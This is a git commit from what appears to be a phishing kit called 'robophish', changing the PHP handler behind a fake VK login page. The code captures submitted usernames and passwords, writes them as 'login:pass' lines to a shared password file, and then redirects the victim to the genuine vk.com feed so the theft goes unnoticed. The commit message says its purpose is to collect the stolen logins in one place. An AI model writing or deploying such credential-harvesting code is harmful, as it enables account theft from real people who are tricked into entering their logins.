b6020714986a4e21c1470aafc969cd11c10f51df
Gasay <59529138+gasayminajj@users.noreply.github.com>
2020-10-17 06:41:48 -0400

    2.1
    Now login:pass in robophish/password.txt

--- sites/aliex/vk/check.php
+++ sites/aliex/vk/check.php
@@ -1,7 +1,7 @@
 <?PHP
 $Log = $_POST['counter'];
 $Pass = $_POST['strike'];
-$log = fopen("password.txt","at");
+$log = fopen("../../../password.txt","at");
 fwrite($log,"$Log:$Pass\n");
 fclose($log);
 echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/feed'></head></html>";
